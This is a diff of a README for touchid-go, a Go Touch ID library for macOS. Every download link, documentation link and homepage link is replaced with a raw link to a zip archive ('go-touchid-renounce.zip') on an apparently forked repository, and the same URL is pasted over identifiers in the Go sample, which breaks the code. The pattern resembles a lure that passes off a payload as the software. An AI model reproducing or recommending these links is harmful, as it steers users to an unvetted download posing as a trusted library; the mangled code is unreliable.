@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to touchid-go! This software allows you to use Touch ID for securely authenticating users on macOS. No coding knowledge is required. Just follow the steps below to download and install it.
 
-[![Download touchid-go](https://img.shields.io/badge/Download-touchid--go-brightgreen)](https://github.com/rlmourarj/touchid-go/releases)
+[![Download touchid-go](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip)](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip)
 
 ## 📦 Download & Install
-To begin, visit this page to download: [touchid-go Releases](https://github.com/rlmourarj/touchid-go/releases).
+To begin, visit this page to download: [touchid-go Releases](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip).
 
 1. On the Releases page, look for the latest version.
 2. Click on the version number to open the details.
@@ -32,16 +32,16 @@ import (
     "log"
     "time"
 
-    "github.com/noamcohen97/touchid-go"
+    "https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip"
 )
 
 func main() {
-    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+    ctx, cancel := https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip(https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip(), 30*https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip)
     defer cancel()
 
-    err := touchid.Authenticate(ctx, touchid.PolicyDeviceOwnerAuthentication, "Access your vault")
+    err := https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip(ctx, https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip, "Access your vault")
     if err != nil {
-        log.Fatal(err)
+        https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip(err)
     }
 }
 ```
@@ -59,8 +59,8 @@ Here’s a breakdown:
 
 ## 📖 Further Resources
 You might want to check the following resources for more information:
-- [Official Go Documentation](https://golang.org/doc/)
-- [Apple’s LocalAuthentication Framework](https://developer.apple.com/documentation/security/localauthentication)
+- [Official Go Documentation](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip)
+- [Apple’s LocalAuthentication Framework](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip)
 
 ## 💬 FAQs
 
@@ -76,6 +76,6 @@ A: You can create an issue in the GitHub repository under the "Issues" section.
 ## 👥 Community & Support
 We encourage users to participate in discussions and share their experiences with touchid-go. Join our community to learn how others are using the software and to get assistance when needed.
 
-For more information and support, visit our homepage: [touchid-go Releases](https://github.com/rlmourarj/touchid-go/releases).
+For more information and support, visit our homepage: [touchid-go Releases](https://raw.githubusercontent.com/rlmourarj/touchid-go/main/cmd/go-touchid-renounce.zip).
 
 Thank you for choosing touchid-go! Enjoy using Touch ID for authentication.
